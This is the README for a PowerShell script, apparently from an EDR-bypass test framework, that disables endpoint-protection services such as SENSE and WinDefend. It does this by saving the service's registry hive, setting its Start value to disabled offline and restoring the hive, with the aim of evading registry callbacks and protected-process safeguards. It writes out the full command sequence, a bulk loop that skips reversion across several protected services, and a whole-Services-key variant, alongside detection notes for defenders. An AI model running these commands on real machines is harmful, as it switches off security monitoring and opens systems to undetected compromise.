# BP1002.6 - Disable EDR User-Mode Service via Registry Save/Restore

## Overview

This variant implements the **BP-1002.6** EDR bypass technique, the most sophisticated service disruption method that uses registry save and restore operations to avoid detection from registry notification callbacks and bypass additional PPL protections. The technique modifies service configuration offline through hive file manipulation.

## Technique Details

**Technique ID:** BP1002.6  
**Technique Name:** Disable EDR User-Mode Service via Registry Save/Restore  
**Category:** EDR Service Disruption  
**Platform:** Windows Vista and later  

### How It Works

1. **Service Registry Save**: Saves the target service's registry key to a binary hive file
2. **Offline Loading**: Loads the hive file under a temporary registry location
3. **Offline Modification**: Modifies the Start value within the loaded hive (offline)
4. **Hive Restoration**: Restores the modified hive back to the original service location
5. **Callback Avoidance**: Registry notification callbacks are bypassed because modifications occur offline
6. **PPL Bypass**: Can affect PPL-protected services with enhanced registry protections

### Registry Save/Restore Sequence

```cmd
# 1. Save service registry key to hive file
reg save "HKLM\SYSTEM\CurrentControlSet\Services\SENSE" "C:\Temp\service.hiv"

# 2. Load hive under temporary location
reg load "HKLM\TempHive" "C:\Temp\service.hiv"

# 3. Modify Start value in loaded hive (offline)
reg add "HKLM\TempHive" /v Start /t REG_DWORD /d 4 /f

# 4. Unload modified hive
reg unload "HKLM\TempHive"

# 5. Restore modified hive to original location
reg restore "HKLM\SYSTEM\CurrentControlSet\Services\SENSE" "C:\Temp\service.hiv"
```

### Advanced Bypass Mechanisms

| Protection Type | Traditional Registry | Registry Save/Restore |
|----------------|---------------------|----------------------|
| **Registry Callbacks** | ✅ Triggers | ❌ Bypassed (offline modification) |
| **PPL Registry Protection** | ❌ May block | ✅ Often bypassed |
| **Real-time Monitoring** | ✅ Detected | ⚠️ Harder to detect |
| **Access Control** | ✅ Enforced | ⚠️ May be bypassed |

## Script Features

### Core Functionality

- **Offline Hive Manipulation**: Modifies service configuration without triggering live registry callbacks
- **PPL Enhanced Compatibility**: Can potentially affect PPL services with additional registry protections
- **Multi-Stage Process**: Implements complete save/load/modify/restore workflow
- **Comprehensive Cleanup**: Manages temporary hive files and registry keys
- **Error Recovery**: Robust cleanup mechanisms for failed operations
- **State Preservation**: Uses backup hives for complete state restoration

### Validation & Verification

- **Privilege Checking**: Verifies administrative privileges before execution
- **Service Existence**: Confirms target service exists on the system
- **Process Monitoring**: Tracks each stage of the save/restore process
- **Configuration Verification**: Confirms Start value was modified correctly
- **Cleanup Validation**: Ensures temporary files and registry keys are removed

### Logging & Monitoring

- **Stage-by-Stage Logging**: Detailed logging for each step of the process
- **Command Execution Tracking**: Logs all reg.exe commands with arguments and results
- **File Management**: Tracks creation and cleanup of temporary hive files
- **Registry Operations**: Monitors hive load/unload operations
- **Error Classification**: Specific error handling for each stage

## Usage

### Standard Execution

```powershell
# Run test against default SENSE service
.\run.ps1

# Target a specific service
.\run.ps1 -TargetService "MsMpSvc"
```

### Advanced Options

```powershell
# Custom target service and directories
.\run.ps1 -TargetService "CylanceSvc" -LogPath "D:\CustomLogs" -TempPath "D:\TempHives"

# Skip state reversion (for debugging)
.\run.ps1 -SkipReversion

# Verbose output
.\run.ps1 -Verbose

# Combined options
.\run.ps1 -TargetService "SentinelAgent" -LogPath "D:\TestLogs" -TempPath "C:\Temp\EDR" -Verbose
```

### Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `TargetService` | String | `"SENSE"` | Name of the EDR service to target |
| `LogPath` | String | `C:\EDRBypassTests\Logs` | Directory for log and result files |
| `TempPath` | String | `$env:TEMP\EDRBypass` | Directory for temporary hive files |
| `SkipReversion` | Switch | `$false` | Skip state reversion for debugging |
| `Verbose` | Switch | `$false` | Enable verbose debug output |

## Requirements

### System Requirements

- **Operating System**: Windows Vista or later
- **Privileges**: Administrator privileges required (SYSTEM may be needed for some operations)
- **Tools**: `reg.exe` (included with Windows)
- **Disk Space**: Sufficient space for temporary hive files
- **Registry Access**: Access to service registry keys

### Critical Dependencies

| Dependency | Purpose | Notes |
|------------|---------|-------|
| **reg.exe** | Registry save/restore operations | Windows built-in tool |
| **Administrative Rights** | Registry hive manipulation | Required for all operations |
| **Temporary Directory** | Hive file storage | Must be writable |
| **Registry Access** | Service key access | Target service must be accessible |

### Permissions

The script requires administrator privileges to:
- Save and restore registry hives using `reg.exe`
- Load and unload registry hives
- Create and manage temporary files
- Access service registry keys
- Write to system log directories

## Hive File Management

### Temporary Files Created

| File | Purpose | Lifecycle |
|------|---------|-----------|
| `original_service.hiv` | Working copy for modification | Created → Modified → Restored |
| `backup_service.hiv` | Original state backup | Created → Used for reversion |
| `modified_service.hiv` | Future use (reserved) | Placeholder for variations |

### Cleanup Operations

The script performs comprehensive cleanup:
- **Registry Key Cleanup**: Unloads and removes temporary registry keys
- **File Cleanup**: Removes all temporary hive files
- **Error Recovery**: Cleanup on failure scenarios
- **Verification**: Confirms cleanup completion

## Advanced PPL Bypass Capabilities

### PPL Protection Levels

| Service Type | Traditional Methods | Registry Save/Restore |
|-------------|-------------------|----------------------|
| **Standard Service** | ✅ All methods work | ✅ Works |
| **PPL Basic** | ❌ Service control blocked | ✅ Often works |
| **PPL + Registry ACL** | ❌ Direct registry blocked | ✅ May work (offline) |
| **PPL + Enhanced Protection** | ❌ All methods blocked | ⚠️ Depends on implementation |

### Why Save/Restore Can Bypass PPL

1. **Offline Modification**: Changes happen outside the live registry
2. **Restoration Bypass**: `reg restore` may bypass some protection mechanisms
3. **Administrative Override**: High-privilege operations may override protections
4. **Timing Window**: Brief moment during restore when protections may not apply

## Output & Results

### Exit Codes

| Code | Status | Description |
|------|--------|-------------|
| 0 | Success | Registry save/restore completed and reverted successfully |
| 1 | General Failure | Unspecified error occurred |
| 2 | Insufficient Privileges | Administrator rights required |
| 3 | Registry Save Failed | Could not save service registry key |
| 4 | Registry Modification Failed | Could not modify loaded hive |
| 5 | Registry Restore Failed | Could not restore modified hive |
| 6 | Registry Verification Failed | Modification not confirmed |
| 7 | Registry Reversion Failed | Could not restore original state |
| 8 | Target Service Not Found | Service does not exist on system |
| 9 | Temporary Hive Cleanup Failed | Could not clean temporary files |

### Result Status Values

- **BYPASSED**: Technique executed successfully
- **FAILED**: Technique failed to execute
- **DETECTED**: Technique was blocked/detected
- **ERROR**: System error occurred

### Log Files

The script generates two types of output files:

1. **Log File**: `BP1002.6-registry-save-restore_YYYYMMDD_HHMMSS.log`
   - Detailed execution log with timestamps
   - All reg.exe command executions and results
   - Hive file management operations
   - Registry load/unload operations
   - Human-readable format

2. **Result File**: `BP1002.6-registry-save-restore_YYYYMMDD_HHMMSS_result.json`
   - Machine-readable test results
   - Status, message, and metadata
   - Used by test orchestrator

### Sample Result JSON

```json
{
  "TechniqueId": "BP1002.6",
  "TechniqueName": "Disable EDR User-Mode Service via Registry Save/Restore",
  "Status": "BYPASSED",
  "Message": "BP1002.6 registry save/restore bypass technique executed successfully (service disabled via offline hive modification, effective after reboot)",
  "Timestamp": "2025-01-27 14:30:45",
  "Details": {
    "TargetService": "SENSE",
    "OriginalStartValue": 2,
    "OriginalStartDescription": "Automatic",
    "BypassApplied": true,
    "BypassVerified": true,
    "StateReverted": true,
    "TempPath": "C:\\Users\\Admin\\AppData\\Local\\Temp\\EDRBypass",
    "BypassMethod": "Registry Save/Restore Offline Modification",
    "RebootRequired": true,
    "HiveFiles": {
      "Original": "C:\\Users\\Admin\\AppData\\Local\\Temp\\EDRBypass\\original_service.hiv",
      "Modified": "C:\\Users\\Admin\\AppData\\Local\\Temp\\EDRBypass\\modified_service.hiv",
      "Backup": "C:\\Users\\Admin\\AppData\\Local\\Temp\\EDRBypass\\backup_service.hiv"
    }
  },
  "ScriptVersion": "1.0.0"
}
```

## Integration with Test Framework

### Orchestrator Communication

The script outputs standardized results that can be consumed by the test orchestrator:

```
TECHNIQUE_RESULT:BYPASSED|BP1002.6 registry save/restore bypass technique executed successfully (service disabled via offline hive modification, effective after reboot)
```

### File Locations

- **Script**: `tests/BP1002-DisableUserModeService/BP1002.6-registry-save-restore/run.ps1`
- **Logs**: `C:\EDRBypassTests\Logs\` (configurable)
- **Temporary Files**: `$env:TEMP\EDRBypass\` (configurable)
- **Results**: JSON files in same directory as logs

## Security Considerations

### Legitimate Use Cases

This technique is designed for:
- **Advanced Security Testing**: Evaluating PPL and registry protection effectiveness
- **Red Team Exercises**: Simulating sophisticated registry manipulation attacks
- **EDR Evasion Research**: Understanding advanced bypass methodologies
- **Protection Mechanism Testing**: Validating registry callback and monitoring systems

### Risk Mitigation

- **Automatic Reversion**: Script automatically restores original registry state
- **Comprehensive Cleanup**: Removes all temporary files and registry keys
- **Reboot Requirement**: Changes only effective after restart (limits immediate impact)
- **Privilege Requirements**: Requires administrator access (limits casual abuse)
- **Logging**: Complete audit trail of all operations
- **Controlled Environment**: Intended for isolated test environments only

### Detection Opportunities

EDR products can detect this technique by monitoring:
- `reg.exe` process execution with save/restore operations
- Registry hive file creation and access patterns
- Temporary registry key creation (`HKLM\*Temp*`)
- Registry restore operations on service keys
- File system access to registry hive files
- Sequence pattern of save → load → modify → restore operations

## Troubleshooting

### Common Issues

1. **Registry Save Access Denied**
   - **Error**: reg save fails with access denied
   - **Solution**: Verify administrator privileges and service key access
   - **Advanced**: May require SYSTEM privileges for some protected services

2. **Hive Load Failures**
   - **Error**: reg load fails to load hive file
   - **Causes**: Corrupted hive file, insufficient privileges, existing key conflict
   - **Solution**: Ensure clean temporary registry namespace

3. **Registry Restore Blocked**
   - **Error**: reg restore fails on target service
   - **Cause**: Service key may have additional protection
   - **Analysis**: This indicates robust protection implementation

4. **Temporary File Access Issues**
   - **Error**: Cannot create or access temporary hive files
   - **Solution**: Verify temp directory permissions and disk space
   - **Alternative**: Use different temp directory path

5. **Cleanup Failures**
   - **Issue**: Temporary files or registry keys remain
   - **Impact**: May affect subsequent runs
   - **Solution**: Manual cleanup or reboot

### Debug Mode

Enable comprehensive debugging:

```powershell
.\run.ps1 -TargetService "SENSE" -Verbose -TempPath "C:\Temp\Debug" -LogPath "C:\Temp"
```

### Manual Registry Operations

Verify operations manually:

```cmd
# Check service registry key
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SENSE"

# Test registry save operation
reg save "HKLM\SYSTEM\CurrentControlSet\Services\SENSE" "C:\Temp\test.hiv"

# Test registry load operation
reg load "HKLM\TestLoad" "C:\Temp\test.hiv"

# Cleanup
reg unload "HKLM\TestLoad"
del "C:\Temp\test.hiv"
```

## Performance Considerations

### Execution Time

- **Complete Process**: 15-45 seconds
- **Registry Save**: 1-5 seconds
- **Hive Load/Unload**: 1-3 seconds each
- **Registry Restore**: 2-10 seconds
- **Verification**: 2-5 seconds

### Resource Usage

- **Memory**: Low to Medium (50-100MB during hive operations)
- **CPU**: Low (brief spikes during reg.exe operations)
- **Disk**: Medium (temporary hive files can be several MB)
- **Network**: None (local operations only)

### Hive File Sizes

| Service Type | Typical Hive Size | Notes |
|-------------|------------------|-------|
| **Simple Service** | 4-16 KB | Basic configuration |
| **Complex Service** | 16-64 KB | Multiple subkeys |
| **EDR Service** | 32-128 KB | Rich configuration |

## Comparison with Other BP1002 Variants

| Variant | Method | PPL Support | Callback Bypass | Stealth Level | Complexity |
|---------|--------|-------------|-----------------|---------------|------------|
| BP1002.1 | services.msc | No | No | Low | Low |
| BP1002.2 | msconfig.exe | No | No | Low | Low |
| BP1002.3 | sc.exe | No | No | Medium | Low |
| BP1002.4 | PowerShell cmdlets | No | No | Medium | Medium |
| BP1002.5 | Registry manipulation | Partial | No | High | Medium |
| **BP1002.6** | **Registry save/restore** | **Yes** | **Yes** | **Highest** | **High** |

### When to Use BP1002.6

**Advantages:**
- Highest PPL service compatibility
- Bypasses registry notification callbacks
- Hardest to detect in real-time
- Most sophisticated evasion technique
- Can bypass enhanced registry protections

**Disadvantages:**
- Most complex implementation
- Requires disk space for temporary files
- Longer execution time
- May leave forensic artifacts in temp files
- Administrator/SYSTEM privileges essential

## Advanced Techniques

### Bulk Service Processing

```powershell
# Target multiple protected services
$protectedServices = @("SENSE", "WinDefend", "MsMpSvc")
foreach ($service in $protectedServices) {
    try {
        .\run.ps1 -TargetService $service -SkipReversion -TempPath "C:\Temp\$service"
        Write-Host "Successfully processed $service" -ForegroundColor Green
    }
    catch {
        Write-Warning "Failed to process $service`: $_"
    }
}
```

### Parent Key Manipulation

```cmd
# Alternative: Save entire Services key to avoid targeting specific service
reg save "HKLM\SYSTEM\CurrentControlSet\Services" "C:\Temp\all_services.hiv"
reg load "HKLM\TempServices" "C:\Temp\all_services.hiv"
reg add "HKLM\TempServices\SENSE" /v Start /t REG_DWORD /d 4 /f
reg unload "HKLM\TempServices"
reg restore "HKLM\SYSTEM\CurrentControlSet\Services" "C:\Temp\all_services.hiv"
```

### Prepared Hive Attacks

```powershell
# Pre-create modified hives for rapid deployment
# 1. Create template with disabled services
# 2. Deploy via simple restore operation
# 3. Bypass detection through pre-computation
```

## Related Techniques

- **BP1002.1**: Disable service using services.msc (GUI-based)
- **BP1002.2**: Disable service using msconfig.exe (GUI-based)
- **BP1002.3**: Disable service using sc.exe (command-line)
- **BP1002.4**: Disable service using PowerShell cmdlets
- **BP1002.5**: Disable service using registry manipulation

## References

- [Windows Registry Hive Files](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)
- [Registry Save and Restore Operations](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)
- [Process Protection Level (PPL) Deep Dive](https://docs.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-)
- [Registry Notification Callbacks](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallback)
- [Advanced Registry Forensics](https://www.microsoft.com/en-us/security/blog/)